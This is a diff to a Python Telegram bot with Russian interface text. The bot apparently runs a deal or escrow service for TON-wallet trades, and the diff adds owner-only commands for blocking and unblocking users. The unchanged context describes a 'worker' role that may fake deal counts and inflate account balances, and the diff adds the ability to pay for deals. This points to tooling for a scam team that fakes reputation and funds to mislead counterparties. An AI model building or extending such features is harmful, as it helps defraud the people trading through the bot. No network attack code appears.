+        block_user_text = """
+🚫 <b>БЛОКИРОВКА ПОЛЬЗОВАТЕЛЯ</b>
+
+<b>Введите ID пользователя:</b>
+• Можно заблокировать любого пользователя (включая администраторов и воркеров)
+• Пользователь потеряет доступ ко всем функциям бота
+• Для разблокировки потребуется действие владельца
+
+<b>Формат:</b>
+<code>123456789</code>
+
+<b>Введите ID пользователя для блокировки:</b>
+        """
+        
+        keyboard = InlineKeyboardMarkup(row_width=1)
+        keyboard.add(InlineKeyboardButton("❌ Отмена", callback_data='block_user_menu'))
+        
+        send_photo_message(chat_id, message_id, block_user_text, keyboard)
+    
+    elif call.data == 'unblock_user':
+        if user_id not in owners:
+            bot.answer_callback_query(call.id, "❌ Доступ запрещён", show_alert=True)
+            return
+        
+        users[user_id]['awaiting_unblock_user'] = True
+        unblock_user_text = """
+✅ <b>РАЗБЛОКИРОВКА ПОЛЬЗОВАТЕЛЯ</b>
+
+<b>Введите ID пользователя:</b>
+• Пользователь получит доступ к функциям бота согласно своему уровню
+• Уровень пользователя сохраняется после разблокировки
+
+<b>Формат:</b>
+<code>123456789</code>
+
+<b>Введите ID пользователя для разблокировки:</b>
+        """
+        
+        keyboard = InlineKeyboardMarkup(row_width=1)
+        keyboard.add(InlineKeyboardButton("❌ Отмена", callback_data='block_user_menu'))
+        
+        send_photo_message(chat_id, message_id, unblock_user_text, keyboard)
+    
+    elif call.data == 'blocked_users_list':
+        if user_id not in owners:
+            bot.answer_callback_query(call.id, "❌ Доступ запрещён", show_alert=True)
+            return
+        
+        blocked_text = f"""
+🚫 <b>СПИСОК ЗАБЛОКИРОВАННЫХ ПОЛЬЗОВАТЕЛЕЙ</b>
+
+<b>Всего заблокировано:</b> {len(blocked_users)} пользователей
+
+<b>Страница:</b> 1
+        """
+        
+        send_photo_message(chat_id, message_id, blocked_text, blocked_users_list_keyboard())
+    
+    elif call.data.startswith('blocked_list_'):
+        if user_id not in owners:
+            bot.answer_callback_query(call.id, "❌ Доступ запрещён", show_alert=True)
+            return
+        
+        page = int(call.data.split('_')[2])
+        blocked_text = f"""
+🚫 <b>СПИСОК ЗАБЛОКИРОВАННЫХ ПОЛЬЗОВАТЕЛЕЙ</b>
+
+<b>Всего заблокировано:</b> {len(blocked_users)} пользователей
+
+<b>Страница:</b> {page + 1}
+        """
+        
+        send_photo_message(chat_id, message_id, blocked_text, blocked_users_list_keyboard(page))
+    
+    elif call.data.startswith('view_blocked_'):
+        if user_id not in owners:
+            bot.answer_callback_query(call.id, "❌ Доступ запрещён", show_alert=True)
+            return
+        
+        blocked_id = int(call.data.split('_')[2])
+        if blocked_id in users:
+            user = users[blocked_id]
+            role = "👤 Пользователь"
+            if blocked_id in owners:
+                role = "👑 Владелец"
+            elif blocked_id in admins:
+                role = "⚙️ Администратор"
+            elif blocked_id in workers:
+                role = "👷 Воркер"
+            
+            blocked_info_text = f"""
+🚫 <b>ИНФОРМАЦИЯ О ЗАБЛОКИРОВАННОМ ПОЛЬЗОВАТЕЛЕ</b>
+
+<b>Пользователь:</b> @{user['username']}
+<b>ID:</b> <code>{blocked_id}</code>
+<b>Уровень:</b> {role}
+<b>Статус:</b> Заблокирован 🚫
+<b>Дата регистрации:</b> {user['join_date']}
+<b>Последняя активность:</b> {user['last_active']}
+<b>Успешных сделок:</b> {user['success_deals']}
+<b>Рейтинг:</b> {user['rating']}⭐
+
+<b>Доступ к боту:</b> Полностью отключен
+            """
+            
+            send_photo_message(chat_id, message_id, blocked_info_text, blocked_user_management_menu(blocked_id))
+    
+    elif call.data.startswith('block_user_'):
+        if user_id not in owners:
+            bot.answer_callback_query(call.id, "❌ Доступ запрещён", show_alert=True)
+            return
+        
+        target_user_id = int(call.data.split('_')[2])
+        
+        if target_user_id in blocked_users:
+            bot.answer_callback_query(call.id, "⚠️ Пользователь уже заблокирован", show_alert=True)
+            return
+        
+        # Блокируем пользователя
+        blocked_users.add(target_user_id)
+        save_data()
+        
+        # Логируем блокировку
+        log_activity(user_id, f'Заблокировал пользователя ID:{target_user_id}')
+        
+        # Отправляем уведомление пользователю
+        if target_user_id in users:
+            user_name = users[target_user_id]['username']
+            block_notification = f"""
+🚫 <b>ВЫ БЫЛИ ЗАБЛОКИРОВАНЫ</b>
+
+Ваш аккаунт был заблокирован владельцем системы.
+Вы потеряли доступ ко всем функциям бота.
+
+<b>Причина блокировки:</b> Нарушение правил системы
+<b>Заблокировал:</b> Владелец системы
+<b>Время:</b> {datetime.now().strftime("%d.%m.%Y %H:%M")}
+
+Для выяснения причин и возможной разблокировки обратитесь к владельцу.
+            """
+            try:
+                bot.send_message(target_user_id, block_notification, parse_mode='HTML')
+            except:
+                pass
+        
+        result_text = f"""
+✅ <b>ПОЛЬЗОВАТЕЛЬ ЗАБЛОКИРОВАН</b>
+
+<b>Пользователь:</b> @{user_name if target_user_id in users else target_user_id}
+<b>ID:</b> <code>{target_user_id}</code>
+<b>Заблокировал:</b> @{users[user_id]['username']}
+<b>Время:</b> {datetime.now().strftime("%d.%m.%Y %H:%M")}
+
+<b>Пользователь полностью потерял доступ к боту.</b>
+<i>Уведомление отправлено пользователю.</i>
+        """
+        
+        send_photo_message(chat_id, message_id, result_text, block_user_menu_keyboard())
+    
+    elif call.data.startswith('unblock_user_'):
+        if user_id not in owners:
+            bot.answer_callback_query(call.id, "❌ Доступ запрещён", show_alert=True)
+            return
+        
+        target_user_id = int(call.data.split('_')[2])
+        
+        if target_user_id not in blocked_users:
+            bot.answer_callback_query(call.id, "⚠️ Пользователь не заблокирован", show_alert=True)
+            return
+        
+        # Разблокируем пользователя
+        blocked_users.remove(target_user_id)
+        save_data()
+        
+        # Логируем разблокировку
+        log_activity(user_id, f'Разблокировал пользователя ID:{target_user_id}')
+        
+        # Отправляем уведомление пользователю
+        if target_user_id in users:
+            user_name = users[target_user_id]['username']
+            unblock_notification = f"""
+✅ <b>ВЫ БЫЛИ РАЗБЛОКИРОВАНЫ</b>
+
+Ваш аккаунт был разблокирован владельцем системы.
+Доступ ко всем функциям бота восстановлен.
+
+<b>Разблокировал:</b> Владелец системы
+<b>Время:</b> {datetime.now().strftime("%d.%m.%Y %H:%M")}
+
+<b>Ваш уровень доступа:</b>
+"""
+            # Добавляем информацию об уровне пользователя
+            if target_user_id in owners:
+                unblock_notification += "👑 Владелец"
+            elif target_user_id in admins:
+                unblock_notification += "⚙️ Администратор"
+            elif target_user_id in workers:
+                unblock_notification += "👷 Воркер"
+            else:
+                unblock_notification += "👤 Пользователь"
+            
+            unblock_notification += "\n\nДобро пожаловать обратно в систему!"
+            
+            try:
+                bot.send_message(target_user_id, unblock_notification, parse_mode='HTML')
+            except:
+                pass
+        
+        result_text = f"""
+✅ <b>ПОЛЬЗОВАТЕЛЬ РАЗБЛОКИРОВАН</b>
+
+<b>Пользователь:</b> @{user_name if target_user_id in users else target_user_id}
+<b>ID:</b> <code>{target_user_id}</code>
+<b>Разблокировал:</b> @{users[user_id]['username']}
+<b>Время:</b> {datetime.now().strftime("%d.%m.%Y %H:%M")}
+
+<b>Доступ пользователя к боту восстановлен.</b>
+<i>Уведомление отправлено пользователю.</i>
+        """
+        
+        send_photo_message(chat_id, message_id, result_text, block_user_menu_keyboard())
+    
     elif call.data == 'noop':
         # Пустое действие, используется для кнопок-заглушек
         bot.answer_callback_query(call.id)
     
     else:
         # Если callback не распознан, показываем главное меню
-        send_photo_message(chat_id, message_id, get_welcome_text(), main_menu(user_id))
+        welcome_text, keyboard = main_menu(user_id)
+        send_photo_message(chat_id, message_id, welcome_text, keyboard)
 
 # Обработчик текстовых сообщений
 @bot.message_handler(content_types=['text', 'photo', 'document'])
 def handle_message(message):
     user_id = message.from_user.id
     chat_id = message.chat.id
+    
+    # Проверяем блокировку
+    if is_user_blocked(user_id):
+        blocked_text = """
+🚫 <b>ВЫ ЗАБЛОКИРОВАНЫ</b>
+
+Ваш аккаунт был заблокирован администрацией.
+Вы не можете использовать функционал бота.
+
+Для выяснения причин обратитесь к администратору.
+        """
+        keyboard = InlineKeyboardMarkup(row_width=1)
+        keyboard.add(InlineKeyboardButton("📞 Связь с администрацией", url='tg://user?id=943896276'))
+        bot.send_message(chat_id, blocked_text, parse_mode='HTML', reply_markup=keyboard)
+        return
     
     # Игнорируем сообщения не от пользователя (например, из групп)
     if message.chat.type != 'private':
@@ -3360,7 +3901,6 @@ def handle_message(message):
             search_query = message.text.strip().lower()
             users[user_id][f'awaiting_search_{search_type}'] = False
             
-            # ИСПРАВЛЕНО: бот теперь воспринимает только числа как ID, а не любой текст
             # Проверяем, является ли запрос числом (ID)
             if search_query.isdigit():
                 # Поиск по ID
@@ -3669,6 +4209,138 @@ def handle_message(message):
             
             del awaiting_private_message[user_id]
             return
+        
+        # НОВЫЕ ФУНКЦИИ: Обработка блокировок пользователей
+        elif user.get('awaiting_block_user'):
+            if user_id not in owners:
+                bot.send_message(chat_id, "❌ <b>ДОСТУП ЗАПРЕЩЁН</b>\n\nТолько владельцы могут блокировать пользователей.", parse_mode='HTML')
+                users[user_id]['awaiting_block_user'] = False
+                return
+            
+            try:
+                target_user_id = int(message.text)
+                
+                if target_user_id in blocked_users:
+                    bot.send_message(chat_id, f"⚠️ <b>ПОЛЬЗОВАТЕЛЬ УЖЕ ЗАБЛОКИРОВАН</b>\n\nПользователь {target_user_id} уже находится в списке заблокированных.", parse_mode='HTML')
+                    users[user_id]['awaiting_block_user'] = False
+                    return
+                
+                # Блокируем пользователя
+                blocked_users.add(target_user_id)
+                save_data()
+                
+                # Логируем блокировку
+                log_activity(user_id, f'Заблокировал пользователя ID:{target_user_id}')
+                
+                # Отправляем уведомление пользователю
+                if target_user_id in users:
+                    user_name = users[target_user_id]['username']
+                    block_notification = f"""
+🚫 <b>ВЫ БЫЛИ ЗАБЛОКИРОВАНЫ</b>
+
+Ваш аккаунт был заблокирован владельцем системы.
+Вы потеряли доступ ко всем функциям бота.
+
+<b>Причина блокировки:</b> Нарушение правил системы
+<b>Заблокировал:</b> Владелец системы
+<b>Время:</b> {datetime.now().strftime("%d.%m.%Y %H:%M")}
+
+Для выяснения причин и возможной разблокировки обратитесь к владельцу.
+                    """
+                    try:
+                        bot.send_message(target_user_id, block_notification, parse_mode='HTML')
+                    except:
+                        pass
+                
+                result_text = f"""
+✅ <b>ПОЛЬЗОВАТЕЛЬ ЗАБЛОКИРОВАН</b>
+
+<b>Пользователь:</b> @{user_name if target_user_id in users else target_user_id}
+<b>ID:</b> <code>{target_user_id}</code>
+<b>Заблокировал:</b> @{user['username']}
+<b>Время:</b> {datetime.now().strftime("%d.%m.%Y %H:%M")}
+
+<b>Пользователь полностью потерял доступ к боту.</b>
+<i>Уведомление отправлено пользователю.</i>
+                """
+                
+                send_photo_message(chat_id, None, result_text, block_user_menu_keyboard())
+                users[user_id]['awaiting_block_user'] = False
+                return
+            except ValueError:
+                bot.send_message(chat_id, "❌ <b>НЕВЕРНЫЙ ФОРМАТ ID</b>\n\nВведите целое число", parse_mode='HTML')
+                return
+        
+        elif user.get('awaiting_unblock_user'):
+            if user_id not in owners:
+                bot.send_message(chat_id, "❌ <b>ДОСТУП ЗАПРЕЩЁН</b>\n\nТолько владельцы могут разблокировать пользователей.", parse_mode='HTML')
+                users[user_id]['awaiting_unblock_user'] = False
+                return
+            
+            try:
+                target_user_id = int(message.text)
+                
+                if target_user_id not in blocked_users:
+                    bot.send_message(chat_id, f"⚠️ <b>ПОЛЬЗОВАТЕЛЬ НЕ ЗАБЛОКИРОВАН</b>\n\nПользователь {target_user_id} не находится в списке заблокированных.", parse_mode='HTML')
+                    users[user_id]['awaiting_unblock_user'] = False
+                    return
+                
+                # Разблокируем пользователя
+                blocked_users.remove(target_user_id)
+                save_data()
+                
+                # Логируем разблокировку
+                log_activity(user_id, f'Разблокировал пользователя ID:{target_user_id}')
+                
+                # Отправляем уведомление пользователю
+                if target_user_id in users:
+                    user_name = users[target_user_id]['username']
+                    unblock_notification = f"""
+✅ <b>ВЫ БЫЛИ РАЗБЛОКИРОВАНЫ</b>
+
+Ваш аккаунт был разблокирован владельцем системы.
+Доступ ко всем функциям бота восстановлен.
+
+<b>Разблокировал:</b> Владелец системы
+<b>Время:</b> {datetime.now().strftime("%d.%m.%Y %H:%M")}
+
+<b>Ваш уровень доступа:</b>
+"""
+                    # Добавляем информацию об уровне пользователя
+                    if target_user_id in owners:
+                        unblock_notification += "👑 Владелец"
+                    elif target_user_id in admins:
+                        unblock_notification += "⚙️ Администратор"
+                    elif target_user_id in workers:
+                        unblock_notification += "👷 Воркер"
+                    else:
+                        unblock_notification += "👤 Пользователь"
+                    
+                    unblock_notification += "\n\nДобро пожаловать обратно в систему!"
+                    
+                    try:
+                        bot.send_message(target_user_id, unblock_notification, parse_mode='HTML')
+                    except:
+                        pass
+                
+                result_text = f"""
+✅ <b>ПОЛЬЗОВАТЕЛЬ РАЗБЛОКИРОВАН</b>
+
+<b>Пользователь:</b> @{user_name if target_user_id in users else target_user_id}
+<b>ID:</b> <code>{target_user_id}</code>
+<b>Разблокировал:</b> @{user['username']}
+<b>Время:</b> {datetime.now().strftime("%d.%m.%Y %H:%M")}
+
+<b>Доступ пользователя к боту восстановлен.</b>
+<i>Уведомление отправлено пользователю.</i>
+                """
+                
+                send_photo_message(chat_id, None, result_text, block_user_menu_keyboard())
+                users[user_id]['awaiting_unblock_user'] = False
+                return
+            except ValueError:
+                bot.send_message(chat_id, "❌ <b>НЕВЕРНЫЙ ФОРМАТ ID</b>\n\nВведите целое число", parse_mode='HTML')
+                return
     
     # Обработка установки реквизитов (для всех пользователей)
     if user.get('awaiting_ton_wallet'):
@@ -3894,6 +4566,7 @@ https://t.me/{bot.get_me().username}?start={deal_id}
 • Возможность накрутки сделок (до 10 за раз)
 • Возможность накрутки баланса (до 1000 в валютах СНГ)
 • Просмотр статистики
+• Возможность оплаты сделок
 
 <b>Обязанности:</b>
 • Соблюдение правил системы
@@ -4025,11 +4698,10 @@ https://t.me/{bot.get_me().username}?start={deal_id}
 <b>Пользователь:</b> @{user_data['username']}
 <b>ID:</b> <code>{worker_id}</code>
 <b>Роль:</b> {"👑 Владелец" if worker_id in owners else "⚙️ Админ" if worker_id in admins else "👷 Воркер" if worker_id in workers else "👤 Пользователь"}
+<b>Статус блокировки:</b> {"🚫 Заблокирован" if is_user_blocked(worker_id) else "✅ Активен"}
 <b>Сделок:</b> {user_data['success_deals']}
 <b>Рейтинг:</b> {user_data['rating']}⭐
 <b>Дата регистрации:</b> {user_data['join_date']}
-
-<b>Статус:</b> ✅ Активен
                     """
                     
                     if worker_id in workers:
@@ -4213,7 +4885,6 @@ https://t.me/{bot.get_me().username}?start={deal_id}
                 return
     
     # Если не обработано другими обработчиками, показываем главное меню
-    # ИСПРАВЛЕНО: Теперь главное меню показывается только при команде /start
     # Для обычных текстовых сообщений ничего не делаем
     if not message.text.startswith('/'):
         # Если это не команда, но пользователь не находится в состоянии ожидания,
@@ -4234,7 +4905,9 @@ https://t.me/{bot.get_me().username}?start={deal_id}
             user.get('awaiting_search_deal'),
             user.get('awaiting_search_deal_activity'),
             user.get('awaiting_search_user_activity'),
-            user.get('awaiting_search_recipient')
+            user.get('awaiting_search_recipient'),
+            user.get('awaiting_block_user'),
+            user.get('awaiting_unblock_user')
         ]):
             # Показываем подсказку о команде /start
             bot.send_message(chat_id, "ℹ️ Используйте команду /start для начала работы с ботом", parse_mode='HTML')
@@ -4248,10 +4921,12 @@ if __name__ == '__main__':
     print(f"📋 СДЕЛОК: {len(deals)}")
     print(f"👑 ВЛАДЕЛЬЦЫ: {len(owners)} | АДМИНЫ: {len(admins) - len(owners)}")
     print(f"👷 ВОРКЕРОВ: {len(workers)}")
+    print(f"🚫 ЗАБЛОКИРОВАННЫХ: {len(blocked_users)}")
     print(f"📊 АКТИВНОСТЕЙ: {sum(len(v) for v in user_activities.values())} пользовательских, {sum(len(v) for v in deal_activities.values())} сделочных")
     print(f"📸 ФОТО ДОСТУПНО: {'✅' if PHOTO_AVAILABLE else '❌'}")
     print(f"📁 ТЕКУЩАЯ ПАПКА: {BASE_DIR}")
     print(f"📝 ГРУППА ДЛЯ ЛОГОВ: {LOG_GROUP_ID}")
+    print(f"👨‍💼 МЕНЕДЖЕР ДЛЯ ПЕРЕДАЧИ: {MANAGER_USERNAME}")
     print("✅ БОТ ГОТОВ К РАБОТЕ!")
     
     # Счетчик попыток
